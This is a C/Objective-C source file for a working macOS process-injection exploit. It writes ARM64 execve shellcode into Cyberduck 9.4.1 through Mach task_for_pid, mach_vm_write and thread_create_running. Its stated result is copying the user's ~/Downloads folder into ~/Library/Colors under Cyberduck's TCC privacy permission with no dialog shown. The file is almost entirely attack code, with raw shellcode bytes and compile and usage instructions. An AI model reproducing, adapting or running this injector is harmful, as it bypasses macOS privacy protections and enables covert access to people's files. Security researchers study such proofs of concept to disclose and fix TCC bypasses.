// cyberduck-inject.m
// Shellcode injector using Mach task_for_pid primitives.
// Target: Cyberduck 9.4.1 (direct download — NOT App Store version)
//
// Compile:
//   clang -framework Foundation -o cyberduck-inject cyberduck-inject.m
//
// Usage:
//   sudo ./cyberduck-inject <PID>
//
// What it does:
//   1. Acquires Cyberduck's task control port via task_for_pid()
//   2. Allocates a stack and code page inside Cyberduck's virtual memory
//   3. Writes the execve shellcode across the process boundary
//   4. Enforces W^X memory permissions
//   5. Configures ARM64 thread state (PC + SP only)
//   6. Detonates via thread_create_running()
//
// Result:
//   execve("/bin/zsh -c 'cp -R ~/Downloads ~/Library/Colors/'") runs
//   inside Cyberduck's process context, inheriting its TCC Downloads entitlement.
//   No privacy dialog is shown to the user.

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdio.h>
#include <string.h>

#define STACK_SIZE 0x1000   // 4 KB stack for injected thread
#define CODE_SIZE  128      // Must be >= shellcode byte count (our shellcode is 112 bytes)

// ARM64 execve shellcode — assembled from shellcode.asm on Sonoma 14.x ARM64.
// To verify on your VM: assemble shellcode.asm, extract __text with dd, compare with xxd.
char shellcode[] =
    "\x00\x00\x00\x10\xff\x83\x00\xd1\xd3\x00\x00\x10\xf4\x01\x00\x30"
    "\xf5\x01\x00\x10\xff\x0f\x00\xf9\xf5\x0b\x00\xf9\xf4\x07\x00\xf9"
    "\xf3\x03\x00\xf9\xe1\x03\x00\x91\x02\x00\x80\xd2\x70\x07\x80\xd2"
    "\x01\x00\x00\xd4\x00\x00\x80\xd2\x30\x00\x80\xd2\x01\x00\x00\xd4"
    "\x2f\x62\x69\x6e\x2f\x7a\x73\x68\x00\x2d\x63\x00\x63\x70\x20\x2d"
    "\x52\x20\x7e\x2f\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x73\x20\x7e\x2f"
    "\x4c\x69\x62\x72\x61\x72\x79\x2f\x43\x6f\x6c\x6f\x72\x73\x2f\x00";

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = (pid_t)atoi(argv[1]);
    printf("[*] Targeting PID: %d\n", pid);

    // ── 1. Acquire task port ──────────────────────────────────────────────────
    // task_for_pid() returns a SEND right to the target's task control port.
    // This is the master key — every subsequent operation passes through it.
    // Requires: root + SIP disabled + target is not an Apple system process.
    task_t remoteTask;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] task_for_pid failed: %s\n"
                        "    Are you root? Is SIP disabled? Right PID?\n",
                mach_error_string(kr));
        return -1;
    }
    printf("[+] Task port: 0x%x\n", remoteTask);

    // ── 2. Allocate remote stack and code pages ───────────────────────────────
    // mach_vm_allocate() with remoteTask as first arg operates inside Cyberduck's
    // virtual memory map, not ours. VM_FLAGS_ANYWHERE = let kernel pick ASLR location.
    mach_vm_address_t remoteStack64 = 0;
    mach_vm_address_t remoteCode64  = 0;

    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_allocate (stack): %s\n", mach_error_string(kr));
        return -1;
    }
    kr = mach_vm_allocate(remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_allocate (code): %s\n", mach_error_string(kr));
        return -1;
    }
    printf("[+] Stack: 0x%llx   Code: 0x%llx\n", remoteStack64, remoteCode64);

    // ── 3. Write shellcode into Cyberduck's memory ───────────────────────────
    // mach_vm_write() crosses the process isolation boundary in a single kernel call.
    kr = mach_vm_write(remoteTask, remoteCode64, (vm_address_t)shellcode, CODE_SIZE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_write: %s\n", mach_error_string(kr));
        return -1;
    }
    printf("[+] Shellcode written\n");

    // ── 4. Enforce W^X permissions ────────────────────────────────────────────
    // Code page: Read + Execute (not writable — W^X)
    kr = vm_protect(remoteTask, remoteCode64, CODE_SIZE, FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] vm_protect (code RX): %s\n", mach_error_string(kr));
        return -1;
    }
    // Stack page: Read + Write (not executable)
    kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE,
                    VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] vm_protect (stack RW): %s\n", mach_error_string(kr));
        return -1;
    }
    printf("[+] W^X enforced\n");

    // ── 5. Configure ARM64 thread state ───────────────────────────────────────
    // arm_unified_thread_state is the exact register snapshot the kernel uses
    // to initialize a hardware thread. We set only two registers:
    //   __pc = where execution starts (our shellcode)
    //   __sp = stack pointer midpoint (ARM64 stack grows DOWN — midpoint avoids
    //          underflowing on the first function call's frame allocation)
    struct arm_unified_thread_state remoteThreadState64;
    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count  = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (uint64_t)remoteCode64;
    remoteThreadState64.ts_64.__sp = (uint64_t)(remoteStack64 + STACK_SIZE / 2);
    printf("[*] PC=0x%llx  SP=0x%llx\n",
           remoteThreadState64.ts_64.__pc,
           remoteThreadState64.ts_64.__sp);

    // ── 6. Create and schedule the thread inside Cyberduck ───────────────────
    // thread_create_running() is atomic: allocates, configures, and schedules
    // the thread in one call. By the time this returns, the thread is running.
    thread_act_t remoteThread;
    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64,
                               (thread_state_t)&remoteThreadState64.ts_64,
                               ARM_THREAD_STATE64_COUNT, &remoteThread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] thread_create_running: %s\n", mach_error_string(kr));
        return -1;
    }

    printf("[+] Thread 0x%x running inside Cyberduck.\n", remoteThread);
    printf("[+] Check ~/Library/Colors/ for ~/Downloads contents.\n");
    return 0;
}
